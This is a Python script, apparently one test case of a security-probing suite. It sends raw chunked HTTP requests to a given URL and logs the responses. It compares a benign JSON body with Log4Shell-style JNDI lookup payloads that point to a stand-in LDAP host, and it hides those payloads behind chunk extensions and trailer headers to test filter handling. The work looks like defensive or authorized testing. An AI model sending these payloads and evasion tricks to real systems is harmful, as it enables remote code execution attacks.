#!/usr/bin/env python3
from __future__ import annotations

import argparse
from pathlib import Path

from http_probe_common import dump_json, ensure_dir, parse_url, save_raw_http_artifacts, send_raw_http, write_csv


def build_chunked_request(
    *,
    path: str,
    host: str,
    content_type: str,
    body: bytes,
    extension: str = "",
    trailer_header: str | None = None,
    trailer_value: str | None = None,
) -> bytes:
    chunk_size = format(len(body), "x")
    chunk_line = chunk_size + (f";{extension}" if extension else "")
    headers = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        "User-Agent: OCB-TC24",
        f"Content-Type: {content_type}",
        "Transfer-Encoding: chunked",
        "Connection: close",
    ]
    if trailer_header:
        headers.append(f"Trailer: {trailer_header}")

    prefix = "\r\n".join(headers).encode("utf-8") + b"\r\n\r\n"
    body_part = chunk_line.encode("ascii") + b"\r\n" + body + b"\r\n"
    final = b"0\r\n"
    if trailer_header and trailer_value is not None:
        final += f"{trailer_header}: {trailer_value}\r\n".encode("utf-8")
    final += b"\r\n"
    return prefix + body_part + final


def main() -> int:
    parser = argparse.ArgumentParser(description="Run TC-24 chunk extension and trailer header probes.")
    parser.add_argument("--url", required=True)
    parser.add_argument("--output-dir", required=True)
    parser.add_argument("--safe-json", default='{"q":"safe"}')
    parser.add_argument("--attack-json", default='{"q":"${jndi:ldap://probe.invalid/tc24}"}')
    parser.add_argument("--timeout", type=int, default=15)
    args = parser.parse_args()

    out_dir = ensure_dir(args.output_dir)
    scheme, host, port, path = parse_url(args.url)
    safe_body = args.safe_json.encode("utf-8")
    attack_body = args.attack_json.encode("utf-8")

    cases = [
        (
            "baseline_chunked_safe",
            build_chunked_request(path=path, host=host, content_type="application/json", body=safe_body),
        ),
        (
            "attack_plain_chunked",
            build_chunked_request(path=path, host=host, content_type="application/json", body=attack_body),
        ),
        (
            "attack_chunk_extension",
            build_chunked_request(
                path=path,
                host=host,
                content_type="application/json",
                body=attack_body,
                extension="foo=bar",
            ),
        ),
        (
            "safe_trailer_attack",
            build_chunked_request(
                path=path,
                host=host,
                content_type="application/json",
                body=safe_body,
                trailer_header="X-Probe",
                trailer_value="${jndi:ldap://probe.invalid/tc24-trailer}",
            ),
        ),
    ]

    rows: list[dict[str, str]] = []
    summary = {"url": args.url, "cases": []}
    for name, request_bytes in cases:
        out_prefix = out_dir / name
        response = send_raw_http(
            scheme=scheme,
            connect_host=host,
            port=port,
            request_bytes=request_bytes,
            timeout=args.timeout,
            sni=host,
        )
        request_text = request_bytes.decode("latin-1", errors="replace")
        result = save_raw_http_artifacts(out_prefix, request_text, response)
        result["case"] = name
        summary["cases"].append(result)
        rows.append(
            {
                "case": name,
                "http_code": result["http_code"],
                "server_header": result["server_header"],
                "content_type": result["content_type"],
                "body_fingerprint": result["body_fingerprint"],
                "body_size": str(result["body_size"]),
                "header_path": result["header_path"],
                "body_path": result["body_path"],
                "request_path": str(out_prefix.with_suffix(".request.txt")),
            }
        )

    dump_json(out_dir / "summary.json", summary)
    write_csv(
        out_dir / "summary.csv",
        ["case", "http_code", "server_header", "content_type", "body_fingerprint", "body_size", "header_path", "body_path", "request_path"],
        rows,
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
